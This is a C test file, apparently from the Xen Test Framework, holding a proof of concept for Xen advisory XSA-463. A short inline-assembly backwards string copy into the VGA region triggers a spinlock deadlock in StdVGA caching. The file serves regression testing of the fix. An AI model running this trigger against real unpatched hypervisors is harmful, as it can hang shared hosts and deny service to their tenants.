/**
 * @file tests/xsa-463/main.c
 * @ref test-xsa-463
 *
 * @page test-xsa-463 XSA-463
 *
 * Advisory: [XSA-463](https://xenbits.xen.org/xsa/advisory-463.html)
 *
 * StdVGA caching intetionally left a spinlock locked beyond the function that
 * acquired it.
 *
 * Commit
 * [046244423898](https://xenbits.xen.org/gitweb/?p=xen.git;a=commitdiff;h=046244423898d422c88c8961136fcd3eaf748d0f)
 * already discovered the deadlock, but it was incorrectly analysed and
 * therefore not fixed properly.
 *
 * @see tests/xsa-463/main.c
 */
#include <xtf.h>

const char test_title[] = "XSA-463 PoC";

void test_main(void)
{
    unsigned long tmp;

    asm volatile ("std\n\t"
                  "rep movsl\n\t"
                  "cld"
                  : "=S" (tmp), "=D" (tmp), "=c" (tmp)
                  : "S" (0x9ffff), "D" (0xa0000), "c" (2)
                  : "memory");

    xtf_success("Success: Not vulnerable to XSA-463\n");
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
